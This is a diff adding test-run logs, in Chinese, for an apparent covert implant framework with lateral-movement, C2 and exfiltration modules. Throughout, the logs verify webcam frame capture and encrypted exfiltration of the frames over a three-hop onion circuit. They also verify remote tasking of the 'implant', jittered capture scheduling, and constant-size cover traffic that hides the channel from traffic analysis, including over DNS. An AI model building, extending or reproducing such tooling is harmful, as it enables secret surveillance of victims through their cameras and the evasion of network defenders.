+=== F1-F12 正向：V4L2 内核 ABI 全序列 ===
+  [OK] F1  open() 成功  0
+  [OK] F2  VIDIOC_QUERYCAP 成功（命令号与结构体大小被内核接受）  qcap_structsz=104
+  [OK] F3  capabilities 带 V4L2_CAP_DEVICE_CAPS  caps=0x84000001
+  [OK] F4  能力判据通过（device_caps 含 CAPTURE|STREAMING）  effcaps=0x4000001
+  [OK] F5  S_FMT(MJPEG) 被拒 —— 触发后端回退分支  errno=22
+  [OK] F6  S_FMT(YUYV) 成功且尺寸回显一致  640x480
+  [OK] F7  sizeimage 与 YUYV422 一致  614400 == 614400
+  [OK] F8  REQBUFS 成功
+  [OK] F9  QUERYBUF 长度正确
+  [OK] F10 QUERYBUF m.offset 页对齐（mmap 前提）
+  [OK] F11 mmap 成功 —— 后端取帧所依赖的通路真实可用
+  [OK] F12 DQBUF 返回真实帧长度  bytesused=614400
+  [OK] F13 mmap 区域是真图案（两处像素不同，非单色/全零填充）  PIX0=eb80eb80eb80eb80 PIX100000=d380d380d380d380
+  [OK] F14 帧内不同字节值种类 >= 8（真像素而非填充）  variety=19
+  [OK] F15 设备确实推进了帧（frame_no>=2）  frame_no=2
+  [OK] S1  后端源码含 DEVICE_CAPS 条件判据（与探针镜像同源，防脱钩）
+=== R1/R2 反向：证明 F11 与 F4 不是恒绿 ===
+  [OK] R1  m.offset 非页对齐时 mmap 必失败 —— F11 有鉴别力  MMAP=-1
+  [OK] R2  老驱动形态（无 DEVICE_CAPS、无采集能力）判据应失败 —— F4 有鉴别力  CAPS_OK=0 effcaps=16777216
+
+共 18 项，通过 18，失败 0
+cc -std=c11 -O2 -Wall -Wextra -Wpedantic -Wshadow -D_DEFAULT_SOURCE -Iinclude -I../14_p2p/include -I../02_c2/include -I../00_crypto/include -I../08_lateral/include -I../agent_windows/include tests/test_exfil_fidelity.c build/exfil.o -o build/test_exfil_fidelity ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o ../14_p2p/build/c2.o ../14_p2p/build/c2_frame.o ../14_p2p/build/crypto_gcm.o ../14_p2p/build/crypto_hash.o ../14_p2p/build/crypto_x25519.o ../agent_windows/build/linux/cam_jpeg.o ../agent_windows/build/linux/cam_mock.o ../agent_windows/build/linux/cam_factory.o ../agent_windows/build/linux/cam_linux_v4l2.o ../14_p2p/build/libp2p.a
+=== 回传链路内容保真度守卫 ===
+
+[PASS] F0 构建 test_exfil_fidelity
+[PASS] F1 回传链路 C 侧断言全过
+[PASS] F2 重组 JPEG 已落盘
+[PASS] F3 重组产物可被真实解码器打开
+[PASS] F4 解码尺寸与原始一致
+[PASS] F5 重建画面亮度 MAE <= 5
+      F5 MAE=0.94
+[PASS] F6 中心区域色度偏差 <= 12
+[PASS] F7 ffmpeg 解码无错误
+[PASS] R1 参考系错配时 MAE 必须 > 5（证明 F5 有鉴别力）
+[PASS] R2 篡改信元后重组必须失败（AEAD 拒绝）
+
+=== total=10 pass=10 fail=0 ===
+./build/test_exfil
+=== 21_exfil 采集产物回传层测试 ===
+
+--- A. 记录编解码 ---
+[PASS] encode 探测模式返回长度
+[PASS] 探测长度 == 头 + 载荷
+[PASS] encode 成功
+[PASS] encode 长度与探测一致
+[PASS] magic 正确
+[PASS] decode 成功
+[PASS] type 往返一致
+[PASS] seq 往返一致
+[PASS] ts_us 往返一致
+[PASS] width 往返一致
+[PASS] height 往返一致
+[PASS] flags 往返一致
+[PASS] name 往返一致
+[PASS] plen 往返一致
+[PASS] payload 字节级一致
+[PASS] 篡改载荷被 CRC 检出
+[PASS] 篡改 name 被 CRC 检出
+[PASS] bad magic 被拒
+[PASS] 错误版本号被拒
+[PASS] rsv 非 0 被拒
+[PASS] 短于头被拒
+[PASS] 长度与 plen 不符被拒
+[PASS] NULL 输入被拒
+[PASS] 超长 name 可编码
+[PASS] 超长 name 解码成功
+[PASS] name 截断为线上字段长度
+[PASS] 截断被 NAME_TRUNC 标志标记
+[PASS] 截断保留前缀
+
+--- B. 信元流与通道 ---
+[PASS] 构造 JPEG 载荷成功
+[PASS] 计算信元数成功
+[PASS] 信元数与预期一致
+      记录 60106 字节 -> 122 个信元 (线上 62464 字节, 膨胀 3.9%)
+[PASS] 发送通道初始化
+[PASS] 接收通道初始化
+[PASS] 发送成功
+[PASS] 实际信元数与预期一致
+[PASS] 信元步进 512 对齐
+[PASS] 中途出现过 PARTIAL 状态
+[PASS] 最终收到 FIN 并产出完整记录
+[PASS] 重组载荷长度一致
+[PASS] 重组载荷字节级一致
+[PASS] 元数据经通道一致
+[PASS] 分辨率经通道一致
+[PASS] 设备名经通道一致
+[PASS] 完成后 incomplete 为 0
+[PASS] 信元流中不含载荷首 16 字节
+[PASS] 信元流中不含载荷中段 16 字节
+[PASS] 信元流中不含载荷尾 16 字节
+[PASS] 信元流中不含载荷特征串(32B)
+[PASS] 信元流中不含设备名
+
+--- C. 抗篡改 / 重放 / 截断 ---
+[PASS] 载荷跨越多个信元（便于测篡改/重放）
+[PASS] 基线：正常信元流解出成功
+[PASS] 篡改信元被 AEAD 拒绝
+[PASS] 重放信元被 IV 绑定检出(AUTH)
+[PASS] 首片正常接收
+[PASS] 跳号信元被 IV 绑定检出(AUTH)
+[PASS] 自愈用例：首片正常
+[PASS] 自愈用例：被篡改的第 2 片被拒
+[PASS] ★ 就地篡改后下一个信元可继续（链路未死）
+[INFO] 篡改后下一片 rc=-4
+[PASS] 少喂 FIN 导致批不完整被检出
+[PASS] 截断后停在 PARTIAL（未误报成功）
+[PASS] 截断被 incomplete 检出
+[PASS] 错误密钥解不开
+[PASS] 发送上下文生成覆盖信元
+[PASS] PAD 之后发送成功
+[PASS] 覆盖信元被忽略且不报错
+[PASS] 覆盖信元不开启新批
+[PASS] 覆盖信元按序混排后正常解出
+[PASS] 混排后载荷字节级一致
+
+--- D. 边界与参数 ---
+[PASS] 空载荷可计算信元数
+[PASS] 空载荷仍产生 1 个信元
+[PASS] 空载荷发送成功
+[PASS] 空载荷实际 1 个信元
+[PASS] 空载荷解出成功
+[PASS] 空载荷长度为 0
+[PASS] 空载荷类型保留
+[PASS] 探测模式（payload=NULL）可解出
+[PASS] 探测模式回填正确长度
+[PASS] 输出缓冲不足返回 LEN
+[PASS] NULL 记录被拒
+[PASS] NULL 信元被拒
+[PASS] NULL 通道被拒
+
+=== total=81 pass=81 fail=0 ===
+./build/test_cam_e2e
+=== 采集 -> 回传 端到端闭环 ===
+[PASS] 创建采集源
+[PASS] 打开采集设备
+[PASS] 采集到一帧
+      原始帧: fmt=1 1x1 len=167
+[PASS] 探测 JPEG 容量
+[PASS] 探测回填所需长度（写到 out_len）
+[PASS] 转码为 JPEG 成功
+[PASS] 转码长度与探测一致
+[PASS] JPEG 长度合法
+[PASS] 转码产物是合法 JPEG（SOI..EOI）
+      JPEG: 167 字节
+[PASS] 发送通道初始化
+[PASS] 接收通道初始化
+[PASS] 计算信元数
+      271 字节记录 -> 1 个信元（线上 512 字节）
+[PASS] 封装并发送
+[PASS] 信元数一致
+[PASS] 重组完成（收到 FIN）
+[PASS] 重组长度与原始 JPEG 一致
+[PASS] 重组结果字节级一致
+[PASS] 重组结果仍是合法 JPEG
+[PASS] 产物类型一致
+[PASS] 分辨率一致
+[PASS] 帧序号一致
+[PASS] 批已完整
+[PASS] 信元流不含 JPEG 首 16 字节
+[PASS] 信元流不含 JPEG 中段 16 字节
+[PASS] 信元流不含设备名
+
+--- YUYV422 转码链路 ---
+[PASS] YUYV 探测容量
+[PASS] YUYV 探测长度非零
+[PASS] YUYV 转码成功
+[PASS] YUYV 转码产物是合法 JPEG
+      YUYV 320x240 -> JPEG 58450 字节
+      58554 字节 -> 119 个信元
+[PASS] 大帧跨越多个信元
+[PASS] YUYV 帧发送成功
+[PASS] YUYV 帧重组完成
+[PASS] YUYV 帧重组长度一致
+[PASS] YUYV 帧字节级一致
+[PASS] YUYV 帧重组后仍是合法 JPEG
+[PASS] YUYV 帧分辨率一致
+[PASS] YUYV 信元流不含明文首 16 字节
+
+=== total=37 pass=37 fail=0 ===
+./build/test_exfil_circuit
+=== 21_exfil 经真实洋葱电路回传（真进程 + 真 socket） ===
+[PASS] edge0 生成静态密钥对
+[PASS] edge1 生成静态密钥对
+[PASS] core 生成静态密钥对
+[PASS] core 节点启动
+[PASS] edge1 节点启动
+[PASS] edge0 节点启动
+[PASS] 用例1 sink 启动
+[PASS] 用例1 发送通道初始化（计数器从 0）
+[PASS] 用例1 洋葱电路建立（3 跳）
+[PASS] 用例1 信元流写入电路
+[INFO] 用例1 信元数=7
+[PASS] 用例1 收到对端回执
+[PASS] 用例1 对端重组完成
+[PASS] 用例1 载荷长度一致
+[PASS] 用例1 字节级一致（CRC）
+[PASS] 用例1 产物类型一致
+[PASS] 用例1 分辨率一致
+[PASS] 用例1 帧序号一致
+[PASS] 用例2 sink 启动
+[PASS] 用例2 发送通道初始化（计数器从 0）
+[PASS] 用例2 洋葱电路建立
+[PASS] 用例2 信元流写入电路
+[INFO] 用例2 载荷=100000 信元数=204（分片生效）
+[PASS] 用例2 大载荷确实走了多信元
+[PASS] 用例2 对端重组完成
+[PASS] 用例2 载荷长度一致
+[PASS] 用例2 字节级一致（CRC）
+[PASS] 用例3 sink 启动
+[PASS] 用例3 发送通道初始化（计数器从 0）
+[PASS] 用例3 洋葱电路建立
+[PASS] 用例3 同电路 3 批全部独立正确（不串批）
+[PASS] 用例4 sink 启动
+[PASS] 用例4 发送通道初始化（计数器从 0）
+[PASS] 用例4 洋葱电路建立
+[PASS] 用例4 空产物仍占 1 个 FIN 信元
+[PASS] 用例4 对端得 DONE 且长度 0
+[PASS] 用例5 sink 启动
+[PASS] 用例5 发送通道初始化（计数器从 0）
+[PASS] 用例5 洋葱电路建立
+[INFO] 用例5 对端 rc=-3 (AEAD authentication failed)
+[PASS] 用例5 篡改后被 AEAD 拒绝（非静默接受）
+[PASS] 用例6 sink 启动
+[PASS] 用例6 发送通道初始化（计数器从 0）
+[PASS] 用例6 洋葱电路建立
+[INFO] 用例6 对端 rc=-6 (batch truncated before FIN)
+[PASS] 用例6 截断被检出（INCOMPLETE，绝不静默成功）
+[PASS] 用例7 洋葱长度探测
+[PASS] 用例7 洋葱构建成功
+[INFO] 用例7 洋葱长度=260
+[PASS] 用例7 洋葱不含最终目标主机名
+[PASS] 用例7 洋葱不含深跳(core) ID 明文
+[PASS] 用例8 线上长度为信元整数倍
+[PASS] 用例8 信元流不含产物首 16 字节
+[PASS] 用例8 信元流不含产物中段 16 字节
+[PASS] 用例8 信元流不含设备名
+total=50 pass=50 fail=0
+./build/test_sched
+=== 21_exfil/sched 测试 ===
+[PASS] init 成功
+[PASS] 未运行时 poll 返回 IDLE
+[PASS] 未运行时大时刻仍 IDLE
+[PASS] start 成功
+[PASS] start 后立即 DUE
+[PASS] commit 应发送
+[PASS] 间隔未到 -> WAIT
+[PASS] 间隔到达 -> DUE
+[PASS] wait_us 计算正确
+[PASS] 已到期 wait_us 为 0
+[PASS] stop 后 IDLE
+[PASS] once 成功
+[PASS] once 后 DUE
+[PASS] once commit
+[PASS] once 采完自动 IDLE
+[PASS] jitter init A
+[PASS] jitter init B 同 seed
+[PASS] 抖动后间隔恒在 [min,max] 内
+[PASS] 同 seed 抖动序列完全一致（可复现）
+[PASS] jitter init 异 seed
+[PASS] 不同 seed 抖动序列不同
+[PASS] burst init
+[PASS] burst 内连续采到 3 帧
+[PASS] burst 到达上限后自动 IDLE（防止忘记 STOP）
+[PASS] burst 后长期保持 IDLE
+[PASS] 重新 start 可再采
+[PASS] quota init
+[PASS] quota t=0 DUE
+[PASS] quota t=1000 DUE
+[PASS] 窗口内已用帧数为 2
+[PASS] 窗口内已用字节为 200
+[PASS] 帧数配额耗尽 -> WAIT
+[PASS] 窗口内仍 WAIT
+[PASS] 窗口滑动后 -> DUE
+[PASS] 滑动后帧数归 1
+[PASS] 滑动后字节归 100
+[PASS] 长空闲后可采
+[PASS] 新窗口配额同样生效
+[PASS] byte quota init
+[PASS] 字节未满可采
+[PASS] 字节配额耗尽 -> WAIT
+[PASS] 字节窗口滑动后恢复
+[PASS] dedup init
+[PASS] 首帧发送
+[PASS] 重复帧跳过
+[PASS] 内容变化发送
+[PASS] 长度变化发送
+[PASS] 跳过的帧不计入帧配额
+[PASS] 跳过的帧不计入字节配额
+[PASS] skip 也推进了时间（3999 尚未到期）
+[PASS] skip 推进后到期点为 4000
+[PASS] dedup 关闭 init
+[PASS] 关闭后首帧发送
+[PASS] 关闭后重复帧仍发送
+[PASS] init 空指针 -> ARG
+[PASS] seed 为 0 -> ARG
+[PASS] max < min -> CFG
+[PASS] 无窗口但有配额 -> CFG
+[PASS] 无窗口但有字节配额 -> CFG
+[PASS] 无窗口无配额 -> OK
+[PASS] 默认配置 init 成功
+[PASS] 默认配置 start 后立即 DUE
+[PASS] 默认配置间隔内 WAIT
+[PASS] wipe 后 IDLE
+[PASS] no-reset init
+[PASS] 配额耗尽 WAIT
+[PASS] stop/start 不刷新配额（防绕过）
+[PASS] 窗口滑动后恢复
+[PASS] errstr DUE
+[PASS] errstr SKIP
+[PASS] errstr CFG
+[PASS] errstr 未知码
+
+=== result: 72 pass, 0 fail ===
+./build/test_sched_gate
+=== 21_exfil/sched gate 集成测试 ===
+[INFO] 采集并转码得到 24 帧
+[INFO] JPEG 大小: min=167 max=167 avg=167 字节（mock 合成图案，非真实摄像头）
+[PASS] mock 采集到足够帧数
+[INFO] 无限速: 24 帧 -> 24 信元, 12288 线上字节
+[PASS] 调度器 init
+[INFO] 调度门控: 发送 2 帧, 跳过(重复) 0, 未到期 22 -> 2 信元, 1024 线上字节
+[PASS] 调度门控下仍有帧被发送（未完全饿死）
+[PASS] 调度门控实际减少了发送帧数
+[PASS] 存在因间隔未到而被抑制的帧
+[PASS] 门控后线上信元数显著下降
+[PASS] 门控后线上字节数显著下降
+[PASS] 发送帧数不超过窗口配额上限
+[PASS] 门控不改变信元格式（已由 test_exfil 覆盖对端解码）
+[PASS] 大帧调度器 init
+[INFO] 单帧 100000 字节 -> 204 信元 -> 104448 线上字节
+[INFO] 字节配额 250KB 下: 6 次机会中实际发送 3 个大帧 -> 612 信元
+[PASS] 字节配额止住大帧发送（6 次机会只发 3 帧，软上限语义）
+[PASS] 大帧确实跨越多个信元（非单信元假象）
+
+=== result: 12 pass, 0 fail ===
+./build/test_task
+=== test_task: C2 下行任务通道 ===
+[PASS] encode cmd 往返-编码成功
+[PASS] decode cmd 往返-解码成功
+[PASS] decode cmd opcode 一致
+[PASS] decode cmd task_id 一致
+[PASS] encode cmd 往返-编码成功
+[PASS] decode cmd 往返-解码成功
+[PASS] decode cmd opcode 一致
+[PASS] decode cmd task_id 一致
+[PASS] encode cmd 往返-编码成功
+[PASS] decode cmd 往返-解码成功
+[PASS] decode cmd opcode 一致
+[PASS] decode cmd task_id 一致
+[PASS] encode cmd 往返-编码成功
+[PASS] decode cmd 往返-解码成功
+[PASS] decode cmd opcode 一致
+[PASS] decode cmd task_id 一致
+[PASS] decode cmd 配置字段一致
+[PASS] encode cmd 往返-编码成功
+[PASS] decode cmd 往返-解码成功
+[PASS] decode cmd opcode 一致
+[PASS] decode cmd task_id 一致
+[PASS] canonical: flags 非 0 被拒
+[PASS] canonical: rsv 非 0 被拒
+[PASS] canonical: pad 非 0 被拒
+[PASS] canonical: 非 SET_CFG 带配置(encode) 被拒
+[PASS] canonical: 非 SET_CFG 带配置(decode) 被拒
+[PASS] canonical: 未知 opcode(encode) 被拒
+[PASS] canonical: 未知 opcode(decode) 被拒
+[PASS] cfg: 合法配置通过
+[PASS] cfg: 抖动区间倒挂被拒
+[PASS] cfg: window_us=0 但配额非零被拒（否则窗口永不滑动）
+[PASS] cfg: window_us=0 且无配额 合法
+[PASS] cfg: 空指针被拒
+[PASS] cfg: 非法配置 encode 被拒
+[PASS] apply: init
+[PASS] apply: 初始 IDLE
+[PASS] apply: START 成功
+[PASS] apply: START -> CONTINUOUS
+[PASS] apply: STOP 成功
+[PASS] apply: STOP -> IDLE
+[PASS] apply: ONCE 成功
+[PASS] apply: ONCE -> ONCE 模式
+[PASS] apply: QUERY 成功
+[PASS] apply: QUERY 不改模式
+[PASS] apply: 未知 opcode 被拒
+[PASS] apply: 空 sched 被拒
+[PASS] apply: 空 cmd 被拒
+[PASS] setcfg: init
+[PASS] setcfg: 前置条件-窗口已被消耗
+[PASS] setcfg: 应用成功
+[PASS] setcfg: 新配置已生效
+[PASS] setcfg: 窗口帧数已生效
+[PASS] setcfg: 不改运行模式
+[PASS] setcfg: 配额窗口未被重置（防高频改配置刷配额）
+[PASS] badcfg: init
+[PASS] badcfg: 被拒
+[PASS] badcfg: 模式未变
+[PASS] badcfg: 计数未变
+[PASS] badcfg: 配置未被部分写入
+[PASS] ack: 编码成功
+[PASS] ack: 解码成功
+[PASS] ack: opcode/status 一致
+[PASS] ack: task_id 一致
+[PASS] ack: mode 一致
+[PASS] ack: frames_sent 一致
+[PASS] ack: window_frames 一致
+[PASS] ack: window_bytes 一致
+[PASS] ack: canonical-rsv 非 0 被拒
+[PASS] ack: 未知 opcode 被拒
+[PASS] ack: fill_ack 成功
+[PASS] ack: fill_ack 反映当前模式
+[PASS] ack: fill_ack 带回 task_id 供关联
+[PASS] ack: fill_ack 空 sched 被拒
+[PASS] seal: 缓冲区足够
+[PASS] seal: 命令封装成功
+[PASS] seal: 线上长度符合帧层定义
+[PASS] seal: 命令解封成功
+[PASS] seal: seq 正确回带
+[PASS] seal: 解封内容正确
+[PASS] seal: 篡改被 AEAD 拒绝
+[PASS] seal: 错密钥被拒
+[PASS] seal: 错 msg_type 被拒
+[PASS] seal: 截断帧被拒
+[PASS] seal: 回执封装成功
+[PASS] seal: 回执解封成功
+[PASS] seal: 回执内容正确
+[PASS] seal: 回执篡改被拒
+[PASS] e2e: 植入体 init
+[PASS] e2e: 服务端封装 START
+[PASS] e2e: 植入体解封
+[PASS] e2e: 执行 START
+[PASS] e2e: 已开始采集
+[PASS] e2e: 填回执
+[PASS] e2e: 封装回执
+[PASS] e2e: 服务端解回执
+[PASS] e2e: 服务端可据 task_id 关联命令与回执
+[PASS] e2e: 回执反映真实模式
+[PASS] e2e: 解封 STOP
+[PASS] e2e: 执行 STOP
+[PASS] e2e: 已远程叫停
+[PASS] e2e: 解封 SET_CFG
+[PASS] e2e: 执行 SET_CFG
+[PASS] e2e: 远程改间隔生效
+[PASS] e2e: SET_CFG 不会意外开始采集
+
+total=104 pass=104 fail=0
+./build/test_task_circuit
+=== 21_exfil 命令经真实洋葱电路下行（真进程 + 真 socket） ===
+[PASS] edge0 生成静态密钥对
+[PASS] edge1 生成静态密钥对
+[PASS] core 生成静态密钥对
+[PASS] core 节点启动
+[PASS] edge1 节点启动
+[PASS] edge0 节点启动
+[PASS] 植入体进程启动
+[PASS] 服务端任务通道初始化
+[PASS] 洋葱电路建立（3 跳）
+[PASS] 用例2 命令写入电路
+[PASS] 用例2 读到植入体报告
+[PASS] 用例2 命令被接受
+[PASS] 用例2 操作码一致
+[PASS] 用例2 回执状态 OK
+[PASS] 用例2 task_id 一致
+[PASS] 用例2 调度器进入 CONTINUOUS
+[PASS] 用例2 回执经电路返回
+[PASS] 用例2 回执内容一致
+[PASS] 用例2 回执模式一致
+[PASS] 用例3 手工封非法配置命令
+[PASS] 用例3 命令写入电路
+[PASS] 用例3 读到植入体报告
+[PASS] 用例3 命令被接受（报文本身合法）
+[PASS] 用例3 回执 BAD_CFG
+[PASS] 用例3 运行模式未变
+[PASS] 用例3 配置未被写入（仍是默认 1s/2s）
+[PASS] 用例3 回执经电路返回
+[PASS] 用例3 回执状态一致
+[PASS] 用例4 命令写入电路
+[PASS] 用例4 读到植入体报告
+[PASS] 用例4 回执 OK
+[PASS] 用例4 配置已生效
+[PASS] 用例4 burst_max 已生效
+[PASS] 用例4 运行模式不变（SET_CFG 不改模式）
+[PASS] 用例4 回执经电路返回
+[PASS] 用例5 命令写入电路
+[PASS] 用例5 读到植入体报告
+[PASS] 用例5 回执 OK
+[PASS] 用例5 QUERY 不改状态
+[PASS] 用例5 回执经电路返回
+[PASS] 用例5 回执 task_id 一致
+[PASS] 用例6 ONCE 写入电路
+[PASS] 用例6 读到植入体报告
+[PASS] 用例6 模式 ONCE
+[PASS] 用例6 ONCE 回执返回
+[PASS] 用例6 STOP 写入电路
+[PASS] 用例6 读到 STOP 报告
+[PASS] 用例6 模式 IDLE
+[PASS] 用例6 STOP 回执返回
+[PASS] 用例7 手工封命令
+[PASS] 用例7 篡改报文写入电路
+[PASS] 用例7 读到植入体报告
+[INFO] 用例7 植入体 rc=-6 (AEAD authentication failed)
+[PASS] 用例7 篡改被 AEAD 拒绝（非静默执行）
+[PASS] 用例7 模式未被篡改命令改变
+[PASS] 用例8 用非会话密钥封命令
+[PASS] 用例8 报文写入电路
+[PASS] 用例8 读到植入体报告
+[INFO] 用例8 植入体 rc=-6 (AEAD authentication failed)
+[PASS] 用例8 非会话密钥被拒绝
+[PASS] 用例9 封合法命令
+[PASS] 用例9 报文写入电路
+[PASS] 用例9 读到植入体报告
+[PASS] 用例9 首次被接受
+[PASS] 用例9 回执返回
+[PASS] 用例9 原样重发
+[PASS] 用例9 读到重放报告
+[INFO] 用例9 重放 rc=-9 (replay rejected (seq not increasing))
+[PASS] 用例9 重放被 seq 单调性拦截
+[PASS] 用例11 旁路通道初始化
+[PASS] 用例11 旁路封命令
+[INFO] 用例11 内层命令报文=112 字节
+[PASS] 用例11 命令写入旁路
+[PASS] 用例11 旁路封回执
+[INFO] 用例11 内层回执报文=88 字节
+[PASS] 用例11 回执写入旁路
+[PASS] 用例11 命令线上恒 512 字节
+[PASS] 用例11 回执线上恒 512 字节
+[PASS] 用例11 命令与回执长度不可区分（无长度指纹）
+[PASS] 用例12 封下行命令
+[PASS] 用例12 封上行回执
+[INFO] 用例12 下行=112 上行=88 字节
+[PASS] 用例12 方向密钥本身不相等
+[PASS] 用例12 报文长度足以取密钥流样本
+[PASS] 用例12 两方向密钥流不同（无 IV 重用）
+[PASS] 用例10 洋葱构建成功
+[INFO] 用例10 洋葱长度=262
+[PASS] 用例10 洋葱不含最终目标主机名
+[PASS] 用例10 洋葱不含深跳(core) ID 明文
+
+=== result: 82 pass, 0 fail ===
+./build/test_link_cover
+[PASS] 用例1 lc 为空 init 被拒
+[PASS] 用例1 正常 init 成功
+[PASS] 用例1 ch 为空 enqueue 被拒
+[PASS] 用例1 lc 为空 enqueue 被拒
+[PASS] 用例1 r 为空 enqueue 被拒
+[PASS] 用例1 无效 fd flush 被拒
+[PASS] 用例1 pending 初始为 0
+[PASS] 用例1 rate 在合理区间
+[PASS] 用例2 send_adaptive 成功
+[PASS] 用例2 确有数据信元发出
+[PASS] 用例2 队列已排空
+[INFO] 用例2 数据信元=1 覆盖信元=0 线上字节=512
+[PASS] 用例2 子进程解出且字节一致
+[PASS] 用例3 空闲期产出了覆盖信元
+[INFO] 用例3 10 次 idle 覆盖信元合计=100 线上字节=51200
+[INFO] 用例3 子进程首个非 OK 返回码 = 0
+[PASS] 用例3 覆盖信元全被识别为 PAD（无一处解包失败）
+[PASS] 用例3 吃掉的信元数等于发出的信元数
+[PASS] 用例3 吃掉的均为覆盖信元（等于覆盖计数）
+[INFO] 用例3 接收端吃掉 100 个信元（覆盖 100）
+[PASS] 用例4 大载荷发送成功
+[PASS] 用例4 数据信元数符合预期（100000B -> 204 信元）
+[INFO] 用例4 数据=204 覆盖=1 线上字节=104960
+[PASS] 用例4 子进程解出 100000B 且字节一致
+[PASS] 用例5 预算为 0 时不发覆盖信元
+[PASS] 用例5 预算为 0 时线上无字节
+[PASS] 用例6 同样预算下 DNS 信道的覆盖速率低于直连
+[PASS] 用例6 直连覆盖速率为正
+[INFO] 用例6 覆盖速率 direct=600 dns=514 (信元/分钟)
+[PASS] 用例6 回填实测成本后覆盖速率下降
+[INFO] 用例6 DNS 画像 2040 -> 实测 2854：覆盖速率 514 -> 367
+[PASS] 用例7 提交 204 信元成功（不再因队列容量被拒）
+[INFO] 用例7 pump rc=0 (ok)
+[PASS] 用例7 首次 pump 成功
+[PASS] 用例7 单批入队受队列容量约束（<=64）
+[INFO] 用例7 首次 pump 后已入队 64/204，本片发出数据=32 覆盖=0
+[PASS] 用例7 反复 pump 后缓冲排空
+[PASS] 用例7 反复 pump 后队列排空
+[PASS] 用例7 pending 归零
+[INFO] 用例7 共 7 片发完 204 信元，累计信元=205
+[PASS] 用例8 errstr OK
+[PASS] 用例8 errstr FULL 含 backpressure
+[PASS] 用例8 errstr 未知码不崩
+
+=== result: 33 pass, 0 fail ===
+./build/test_task_cover
+=== test_task_cover ===
+[PASS] init 空指针被拒
+[PASS] init 正常成功
+[PASS] period_ms 为 0 取默认值 500
+[PASS] tick 空 chan 被拒
+[PASS] tick 空 cover 被拒
+[PASS] burst 非法 fd 被拒
+[PASS] send_cover 连发 3 个成功
+[PASS] 子进程回报统计完整
+[PASS] 3 个覆盖信元均被识别为 PAD（非命令、非错误）
+[PASS] 覆盖信元未误报为命令
+[PASS] 覆盖后发真实命令成功
+[PASS] 5 个覆盖被识别
+[PASS] 1 条命令被解出
+[PASS] 命令 seq=7 原样保留（覆盖未消耗应用层序号）
+[PASS] 未到期不发覆盖（n=0 是正常而非错误）
+[PASS] 到期后产出覆盖信元
+[INFO] 1000ms 到期产出覆盖信元数=1 速率=108/分钟
+[INFO] 低速速率=2/分钟
+[INFO] 低速 120 次 tick(共 60s) 累计覆盖=1
+[PASS] 极低速下余量累积仍能凑出覆盖信元（整除归零已解决）
+[PASS] 预算 0 明确禁用覆盖（不发信元）
+[INFO] 同预算下 直连=108/分钟 DNS=29/分钟
+[PASS] DNS 信道成本高，覆盖速率低于直连（低速信道不被打满）
+[INFO] 回填实测成本 2854 后 DNS=21/分钟
+[PASS] 回填更高实测成本后覆盖速率进一步下调
+[PASS] 对端关闭时 tick 返回 IO 错误（不静默成功）
+[PASS] 覆盖信元线上长度恒为 512（与命令不可按长度区分）
+=== result: 22 pass, 0 fail ===
+./build/test_cover_loop
+[PASS] init 空指针被拒
+[PASS] init 非法 fd 被拒
+[PASS] init 空 chan 被拒
+[PASS] init 非法 side 被拒
+[PASS] init 正常成功
+[PASS] period_ms 为 0 取默认 500
+[PASS] 未 init 的 step 被拒
+[PASS] 未 init 的 run 被拒
+[PASS] run 空时钟被拒
+[PASS] 服务端循环 init 成功
+[PASS] 植入体循环 init 成功
+[PASS] 空闲期服务端（下行）确实发出了覆盖
+[PASS] 空闲期植入体（上行）确实发出了覆盖
+[PASS] 植入体收到下行的覆盖并识别为 PAD
+[PASS] 服务端收到上行的覆盖并识别为 PAD
+[PASS] 服务端未把 PAD 派发为命令/回执
+[PASS] 植入体未把 PAD 派发为命令/回执
+[PASS] 双向均无真实消息（纯空闲）
+[PASS] 服务端下发命令成功
+[PASS] 植入体在覆盖流中读到命令
+[PASS] 命令在覆盖流中被正确派发（恰好 1 条）
+[PASS] 命令 task_id 一致
+[PASS] 命令 seq 一致（覆盖未污染序号空间）
+[PASS] 命令 opcode 一致
+[PASS] 植入体回执成功
+[PASS] 服务端在覆盖流中读到回执
+[PASS] 回执在覆盖流中被正确派发（恰好 1 条）
+[PASS] 回执 task_id 一致
+[PASS] 命令之后覆盖仍在继续（无观测凹陷）
+[PASS] 预算 0 => 两端均不产生覆盖
+[PASS] 预算 0 => 链路上无 PAD
+[PASS] 对端关闭返回 EXF_LOOP_ERR_CLOSED（非 IO 混同）
+[PASS] run 正常超时退出（无错误）
+[PASS] run 在空闲期确实发出了覆盖（硬规则 1）
+[PASS] run 迭代多次而非一次跑完
+[PASS] stop 标志被置位
+[PASS] 已 stop 的 run 立即返回 OK
+[PASS] 空闲覆盖速率 > 0
+[PASS] note_data 大批数据成功
+[PASS] note_data(0) 视作无效调用，不报错
+[PASS] 130 轮推进中途无 IO 错误
+[INFO] 空闲覆盖速率=108  数据突发后=108
+[PASS] 数据突发后覆盖速率不高于空闲值（覆盖让位，不超预算）
+=== result: 42 pass, 0 fail ===
+./build/test_cover_circuit
+=== 21_exfil 覆盖循环接进真实洋葱电路（3 跳真进程 + tee 抓包）===
+[INFO] A oper: rc=0 cover_sent=5 pad_recv=5 msg_recv=3 rate=600 bytes=4096 cells=8 maxgap=164ms tail=41ms
+[INFO] A imp : rc=-7 cover_sent=5 pad_recv=5 msg_recv=3 n_cmd=3 last_id=3002 st=0 mode=2
+[PASS] 用例9 operator 循环正常退出
+[PASS] 用例3a operator 侧发出了覆盖信元
+[PASS] 用例2a operator 侧收到了对端覆盖（双向补）
+[PASS] 用例2b implant 侧也发出了覆盖信元（双向补）
+[PASS] 用例2c implant 侧收到了对端覆盖
+[PASS] 用例3b 覆盖流中收到真实回执
+[PASS] 用例3c 植入体执行了命令并回执
+[PASS] 用例3d 命令经电路生效（调度器进入 CONTINUOUS）
+[PASS] 用例4 线上总字节是 512 的整数倍（恒长）
+[PASS] 用例5a 有覆盖时线上信元数充足
+[PASS] 用例5b 有覆盖时相邻信元间隔有上界
+[INFO] B oper: rc=0 cover_sent=0 msg_recv=3 bytes=1536 cells=3 maxgap=1ms tail=615ms
+[PASS] 用例6a 预算为 0 时不发覆盖（静默）
+[PASS] 用例6a2 植入体侧同样静默
+[PASS] 用例6b 静默链路的线上信元数显著少于有覆盖
+[PASS] 用例6c 静默链路尾部静默更长（命令发完即死寂）
+[PASS] 用例6d 有覆盖的尾部静默不到静默链路的四分之一
+[PASS] 用例6e 有覆盖时尾部静默有上界（链路持续有流量）
+[INFO] C imp : rc=-3 (authentication failed) msg_recv=1 n_cmd=1
+[PASS] 用例7a 篡改信元被检出（AUTH），不是静默执行
+[PASS] 用例7b 篡改前的合法命令仍被正常执行
+
